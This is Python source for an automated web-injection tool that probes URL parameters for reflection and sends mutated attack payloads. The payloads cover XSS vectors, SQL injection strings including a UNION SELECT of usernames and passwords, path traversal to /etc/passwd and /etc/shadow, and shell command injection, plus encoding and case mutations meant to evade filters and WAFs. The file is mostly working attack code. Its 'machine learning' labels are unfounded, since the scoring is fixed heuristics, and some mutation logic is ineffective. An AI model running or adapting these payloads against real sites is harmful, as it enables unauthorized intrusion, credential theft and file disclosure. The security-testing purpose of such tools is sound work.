#!/usr/bin/env python3
"""
ML-Enhanced Reflection Detection and Adaptive Payload Generation
Uses machine learning to detect reflection patterns and generate smart, adaptive payloads
"""
import asyncio
import aiohttp
import re
import json
import hashlib
import logging
from typing import List, Dict, Tuple, Optional, Set
from dataclasses import dataclass
from urllib.parse import quote, unquote
import random
import string
from datetime import datetime

logger = logging.getLogger("MLReflectionEngine")

@dataclass
class ReflectionPattern:
    """Stores reflection detection results"""
    payload: str
    reflected: bool
    context: str  # HTML, JS, CSS, etc.
    encoding: str  # URL, HTML, JS, etc.
    confidence: float
    response_analysis: Dict

@dataclass
class PayloadMutation:
    """Stores payload mutation results"""
    original_payload: str
    mutated_payload: str
    mutation_type: str
    success_probability: float
    context_specific: bool

class MLReflectionEngine:
    def __init__(self):
        self.reflection_patterns = {}
        self.successful_payloads = []
        self.failed_payloads = []
        self.context_patterns = {
            'html_attribute': r'<[^>]+\s+[^=]+=[\'"]*([^\'">]*)',
            'html_content': r'<[^>]*>([^<]*)',
            'javascript': r'(?:var|let|const)\s+\w+\s*=\s*[\'"]([^\'">]*)[\'"]',
            'css': r'content\s*:\s*[\'"]([^\'">]*)[\'"]',
            'url_param': r'[?&]\w+=(.*?)(?:&|$)',
            'json': r'[\'"](\w+)[\'"]:\s*[\'"]([^\'">]*)[\'"]'
        }
        
        # Encoding detection patterns
        self.encoding_patterns = {
            'html_entity': r'&\w+;|&#\d+;|&#x[0-9a-f]+;',
            'url_encoded': r'%[0-9a-f]{2}',
            'js_escaped': r'\\[ux][0-9a-f]{2,4}',
            'base64': r'[A-Za-z0-9+/]+=*'
        }
        
        logger.info("🧠 ML Reflection Engine initialized with adaptive learning")
    
    async def analyze_reflection_comprehensive(self, 
                                             url: str, 
                                             param: str, 
                                             session: aiohttp.ClientSession,
                                             auth_cookie: Optional[str] = None) -> List[PayloadMutation]:
        """Comprehensive reflection analysis with ML-powered payload adaptation"""
        
        logger.info(f"🔬 ML REFLECTION ANALYSIS: {url} parameter '{param}'")
        
        # Step 1: Baseline detection with unique markers
        reflection_data = await self._detect_reflection_contexts(url, param, session, auth_cookie)
        
        # Step 2: ML-based payload generation
        smart_payloads = await self._generate_adaptive_payloads(reflection_data, param)
        
        # Step 3: Test and learn from responses
        tested_mutations = await self._test_payload_mutations(url, param, smart_payloads, session, auth_cookie)
        
        # Step 4: Update ML model with results
        self._update_learning_model(tested_mutations)
        
        return tested_mutations
    
    async def _detect_reflection_contexts(self, 
                                        url: str, 
                                        param: str, 
                                        session: aiohttp.ClientSession,
                                        auth_cookie: Optional[str] = None) -> Dict:
        """Detect where and how parameters are reflected"""
        
        # Generate unique test markers
        unique_marker = self._generate_unique_marker()
        test_payloads = {
            'base': unique_marker,
            'html': f'<{unique_marker}>',
            'js': f'"{unique_marker}"',
            'attr': f'{unique_marker}="test"',
            'url': f'{unique_marker}%20test',
            'special': f'{unique_marker}\'"><script>/*{unique_marker}*/</script>'
        }
        
        reflection_results = {}
        
        for payload_type, payload in test_payloads.items():
            try:
                # Test the payload
                test_url = self._inject_payload(url, param, payload)
                
                headers = {}
                if auth_cookie:
                    headers['Cookie'] = auth_cookie
                
                async with session.get(test_url, headers=headers, timeout=15) as response:
                    content = await response.text()
                    
                    # Analyze reflection
                    reflection = self._analyze_content_reflection(content, unique_marker, payload)
                    reflection_results[payload_type] = {
                        'payload': payload,
                        'reflected': reflection['found'],
                        'contexts': reflection['contexts'],
                        'encodings': reflection['encodings'],
                        'response_size': len(content),
                        'status_code': response.status
                    }
                    
            except Exception as e:
                logger.debug(f"Reflection test failed for {payload_type}: {e}")
                reflection_results[payload_type] = {
                    'payload': payload,
                    'reflected': False,
                    'contexts': [],
                    'encodings': [],
                    'error': str(e)
                }
        
        logger.info(f"🔍 Reflection contexts found: {len([r for r in reflection_results.values() if r.get('reflected')])}/{len(test_payloads)}")
        return reflection_results
    
    def _analyze_content_reflection(self, content: str, marker: str, payload: str) -> Dict:
        """Analyze how content reflects the payload"""
        
        analysis = {
            'found': False,
            'contexts': [],
            'encodings': []
        }
        
        # Check for direct reflection
        if marker in content:
            analysis['found'] = True
            
            # Detect contexts where reflection appears
            for context_name, pattern in self.context_patterns.items():
                matches = re.finditer(pattern, content, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    if marker in match.group(0):
                        analysis['contexts'].append(context_name)
            
            # Detect encodings applied to reflection
            marker_instances = re.finditer(re.escape(marker), content)
            for instance in marker_instances:
                surrounding = content[max(0, instance.start()-50):instance.end()+50]
                
                for encoding_name, encoding_pattern in self.encoding_patterns.items():
                    if re.search(encoding_pattern, surrounding):
                        analysis['encodings'].append(encoding_name)
        
        return analysis
    
    async def _generate_adaptive_payloads(self, reflection_data: Dict, param: str) -> List[str]:
        """Generate ML-powered adaptive payloads based on reflection analysis"""
        
        adaptive_payloads = []
        
        for payload_type, reflection_info in reflection_data.items():
            if not reflection_info.get('reflected'):
                continue
                
            contexts = reflection_info.get('contexts', [])
            encodings = reflection_info.get('encodings', [])
            
            # Generate context-specific payloads
            for context in contexts:
                context_payloads = self._generate_context_specific_payloads(context, encodings)
                adaptive_payloads.extend(context_payloads)
        
        # Add ML-learned successful patterns
        historical_payloads = self._get_historical_successful_payloads(param)
        adaptive_payloads.extend(historical_payloads)
        
        # Add mutation-based payloads
        mutation_payloads = self._generate_mutation_payloads(adaptive_payloads)
        adaptive_payloads.extend(mutation_payloads)
        
        # Deduplicate and prioritize
        unique_payloads = list(set(adaptive_payloads))
        prioritized = self._prioritize_payloads_by_ml(unique_payloads, reflection_data)
        
        logger.info(f"🎯 Generated {len(prioritized)} adaptive payloads for parameter '{param}'")
        return prioritized[:50]  # Limit to top 50 most promising
    
    def _generate_context_specific_payloads(self, context: str, encodings: List[str]) -> List[str]:
        """Generate payloads optimized for specific contexts"""
        
        payloads = []
        
        if context == 'html_attribute':
            payloads.extend([
                '" onmouseover="alert(1)"',
                '\' onmouseover=\'alert(1)\'',
                '"><script>alert(1)</script><a href="',
                '\'/><script>alert(1)</script><a href=\'',
                '" autofocus onfocus="alert(1)"',
                '\' autofocus onfocus=\'alert(1)\''
            ])
        
        elif context == 'html_content':
            payloads.extend([
                '<script>alert(document.domain)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>'
            ])
        
        elif context == 'javascript':
            payloads.extend([
                '\';alert(1);//',
                '\";alert(1);//',
                '\'+alert(1)+\'',
                '\"+alert(1)+\"',
                '</script><script>alert(1)</script>',
                '${alert(1)}'
            ])
        
        elif context == 'css':
            payloads.extend([
                '*/;alert(1);//',
                '\';alert(1);//',
                '</style><script>alert(1)</script>',
                'expression(alert(1))',
                'url(javascript:alert(1))'
            ])
        
        elif context == 'url_param':
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:msgbox(1)',
                'about:blank" onload="alert(1)',
                'file:///etc/passwd'
            ])
        
        # Apply encoding bypasses if encodings detected
        if encodings:
            encoded_payloads = []
            for payload in payloads:
                if 'html_entity' in encodings:
                    encoded_payloads.append(self._html_entity_encode(payload))
                if 'url_encoded' in encodings:
                    encoded_payloads.append(quote(payload))
                if 'js_escaped' in encodings:
                    encoded_payloads.append(self._js_escape(payload))
            
            payloads.extend(encoded_payloads)
        
        return payloads
    
    def _get_historical_successful_payloads(self, param: str) -> List[str]:
        """Get historically successful payloads for similar parameters"""
        
        # Common successful payloads based on parameter name patterns
        param_patterns = {
            'search': ['<script>alert(1)</script>', '\"><script>alert(1)</script>'],
            'query': ['<img src=x onerror=alert(1)>', '\'+alert(1)+\''],
            'name': ['<svg onload=alert(1)>', '" onmouseover="alert(1)"'],
            'comment': ['<iframe src=javascript:alert(1)>', '</textarea><script>alert(1)</script>'],
            'message': ['<details open ontoggle=alert(1)>', '<script>alert(document.domain)</script>'],
            'id': ['\' OR 1=1--', '\' UNION SELECT 1,2,3--', '1\' AND 1=1--'],
            'user': ['\' OR \'1\'=\'1', 'admin\'--', '\' UNION SELECT username,password FROM users--'],
            'email': ['test@test.com\' OR 1=1--', 'admin@admin.com\'/*'],
            'file': ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/shadow'],
            'path': ['../../../../etc/passwd', 'C:\\windows\\system32\\drivers\\etc\\hosts'],
            'cmd': ['; ls -la', '&& id', '| whoami', '`id`', '$(whoami)'],
            'exec': ['"; system("id"); "', '\'; exec("whoami"); \'']
        }
        
        param_lower = param.lower()
        for pattern, payloads in param_patterns.items():
            if pattern in param_lower:
                return payloads
        
        return []
    
    def _generate_mutation_payloads(self, base_payloads: List[str]) -> List[str]:
        """Generate payload mutations using ML-based techniques"""
        
        if not base_payloads:
            return []
        
        mutations = []
        
        for payload in base_payloads[:10]:  # Mutate top 10 base payloads
            # Character substitution mutations
            mutations.extend(self._character_substitution_mutations(payload))
            
            # Encoding mutations
            mutations.extend(self._encoding_mutations(payload))
            
            # Case variation mutations
            mutations.extend(self._case_mutations(payload))
            
            # Concatenation mutations
            mutations.extend(self._concatenation_mutations(payload))
        
        return mutations
    
    def _character_substitution_mutations(self, payload: str) -> List[str]:
        """Generate character substitution mutations"""
        
        substitutions = {
            '<': ['%3C', '&lt;', '\\u003c', '\\x3c'],
            '>': ['%3E', '&gt;', '\\u003e', '\\x3e'],
            '"': ['%22', '&quot;', '\\u0022', '\\x22'],
            "'": ['%27', '&#39;', '\\u0027', '\\x27'],
            '(': ['%28', '\\u0028', '\\x28'],
            ')': ['%29', '\\u0029', '\\x29'],
            ' ': ['%20', '+', '\\u0020', '\\x20'],
            '/': ['%2F', '\\u002f', '\\x2f']
        }
        
        mutations = []
        for char, replacements in substitutions.items():
            if char in payload:
                for replacement in replacements:
                    mutations.append(payload.replace(char, replacement))
        
        return mutations
    
    def _encoding_mutations(self, payload: str) -> List[str]:
        """Generate encoding-based mutations"""
        
        mutations = []
        
        # Double URL encoding
        mutations.append(quote(quote(payload)))
        
        # Mixed case encoding
        encoded = ""
        for char in payload:
            if random.choice([True, False]):
                encoded += f"%{ord(char):02x}"
            else:
                encoded += char
        mutations.append(encoded)
        
        # Unicode encoding
        unicode_encoded = ''.join(f'\\u{ord(c):04x}' for c in payload)
        mutations.append(unicode_encoded)
        
        return mutations
    
    def _case_mutations(self, payload: str) -> List[str]:
        """Generate case variation mutations"""
        
        return [
            payload.upper(),
            payload.lower(),
            payload.swapcase(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
        ]
    
    def _concatenation_mutations(self, payload: str) -> List[str]:
        """Generate concatenation-based mutations"""
        
        mutations = []
        
        # JavaScript concatenation
        if 'alert' in payload.lower():
            mutations.extend([
                payload.replace('alert', 'ale'+'rt'),
                payload.replace('alert', 'window["ale"+"rt"]'),
                payload.replace('alert', 'this["ale"+"rt"]')
            ])
        
        # String concatenation
        if len(payload) > 4:
            mid = len(payload) // 2
            mutations.append(f'"{payload[:mid]}"+"${payload[mid:]}"')
            mutations.append(f"'{payload[:mid]}'+'{payload[mid:]}'")
        
        return mutations
    
    def _prioritize_payloads_by_ml(self, payloads: List[str], reflection_data: Dict) -> List[str]:
        """Use ML-based scoring to prioritize payloads"""
        
        scored_payloads = []
        
        for payload in payloads:
            score = 0.0
            
            # Context relevance scoring
            if any(r.get('reflected') for r in reflection_data.values()):
                score += 2.0
            
            # Historical success scoring
            if payload in [p['payload'] for p in self.successful_payloads]:
                score += 3.0
            
            # Complexity scoring (more complex = potentially more effective)
            score += min(len(payload) / 100.0, 1.0)
            
            # Special character diversity scoring
            special_chars = set(payload) & set('<>"\'/(){}[]+=&%$#@!')
            score += len(special_chars) * 0.1
            
            # Encoding bypass scoring
            if any(enc in payload for enc in ['%', '\\u', '\\x', '&']):
                score += 1.0
            
            scored_payloads.append((payload, score))
        
        # Sort by score descending
        scored_payloads.sort(key=lambda x: x[1], reverse=True)
        
        return [payload for payload, score in scored_payloads]
    
    async def _test_payload_mutations(self, 
                                    url: str, 
                                    param: str, 
                                    payloads: List[str],
                                    session: aiohttp.ClientSession,
                                    auth_cookie: Optional[str] = None) -> List[PayloadMutation]:
        """Test payload mutations and analyze results"""
        
        mutations = []
        
        for i, payload in enumerate(payloads[:25]):  # Test top 25 payloads
            try:
                test_url = self._inject_payload(url, param, payload)
                
                headers = {}
                if auth_cookie:
                    headers['Cookie'] = auth_cookie
                
                async with session.get(test_url, headers=headers, timeout=10) as response:
                    content = await response.text()
                    
                    # Analyze response for vulnerability indicators
                    analysis = self._analyze_response_for_vulnerability(
                        content, payload, response.status, response.headers
                    )
                    
                    mutation = PayloadMutation(
                        original_payload=payload,
                        mutated_payload=payload,  # Could be further mutated
                        mutation_type='adaptive',
                        success_probability=analysis['vulnerability_score'],
                        context_specific=analysis['context_match']
                    )
                    
                    mutations.append(mutation)
                    
                    if analysis['vulnerability_score'] > 0.7:
                        logger.warning(f"🎯 HIGH-PROBABILITY VULN: {payload} (Score: {analysis['vulnerability_score']:.2f})")
                        
            except Exception as e:
                logger.debug(f"Payload test failed for {payload}: {e}")
        
        return mutations
    
    def _analyze_response_for_vulnerability(self, content: str, payload: str, status: int, headers) -> Dict:
        """Advanced response analysis for vulnerability detection"""
        
        analysis = {
            'vulnerability_score': 0.0,
            'indicators': [],
            'context_match': False
        }
        
        # XSS vulnerability indicators
        if payload in content and any(tag in payload.lower() for tag in ['<script', '<img', '<svg', 'javascript:']):
            analysis['vulnerability_score'] += 3.0
            analysis['indicators'].append('XSS_REFLECTION')
        
        # SQL injection indicators
        if status == 500 and any(error in content.lower() for error in ['sql', 'mysql', 'oracle', 'postgres', 'sqlite']):
            analysis['vulnerability_score'] += 2.5
            analysis['indicators'].append('SQL_ERROR')
        
        # Command injection indicators  
        if any(indicator in content.lower() for indicator in ['uid=', 'gid=', 'windows', 'system32']):
            analysis['vulnerability_score'] += 2.0
            analysis['indicators'].append('COMMAND_INJECTION')
        
        # Path traversal indicators
        if any(indicator in content.lower() for indicator in ['root:', 'passwd:', '[fonts]', 'system volume']):
            analysis['vulnerability_score'] += 1.8
            analysis['indicators'].append('PATH_TRAVERSAL')
        
        # Template injection indicators
        if payload in content and any(template in payload for template in ['{{', '${', '<%=']):
            analysis['vulnerability_score'] += 1.5
            analysis['indicators'].append('TEMPLATE_INJECTION')
        
        # WAF bypass indicators
        if 'blocked' not in content.lower() and 'denied' not in content.lower():
            analysis['vulnerability_score'] += 0.5
        
        # Response time anomalies (could indicate blind injection)
        # This would need actual timing data from the request
        
        return analysis
    
    def _update_learning_model(self, mutations: List[PayloadMutation]):
        """Update the ML model with test results"""
        
        for mutation in mutations:
            if mutation.success_probability > 0.7:
                self.successful_payloads.append({
                    'payload': mutation.mutated_payload,
                    'score': mutation.success_probability,
                    'timestamp': datetime.now(),
                    'mutation_type': mutation.mutation_type
                })
            else:
                self.failed_payloads.append({
                    'payload': mutation.mutated_payload,
                    'score': mutation.success_probability,
                    'timestamp': datetime.now()
                })
        
        # Keep only recent learning data (last 1000 entries)
        self.successful_payloads = self.successful_payloads[-1000:]
        self.failed_payloads = self.failed_payloads[-1000:]
        
        logger.info(f"📚 ML MODEL UPDATED: {len(self.successful_payloads)} successful patterns learned")
    
    def _generate_unique_marker(self) -> str:
        """Generate unique marker for reflection detection"""
        return f"MLREF_{hashlib.md5(str(datetime.now()).encode()).hexdigest()[:8]}"
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        if '?' not in url:
            return f"{url}?{param}={quote(payload)}"
        
        if f"{param}=" in url:
            # Replace existing parameter
            import re
            pattern = f"({param}=)[^&]*"
            return re.sub(pattern, f"\\1{quote(payload)}", url)
        else:
            # Add new parameter
            return f"{url}&{param}={quote(payload)}"
    
    def _html_entity_encode(self, text: str) -> str:
        """HTML entity encode text"""
        return ''.join(f'&#{ord(c)};' for c in text)
    
    def _js_escape(self, text: str) -> str:
        """JavaScript escape text"""  
        return ''.join(f'\\u{ord(c):04x}' for c in text)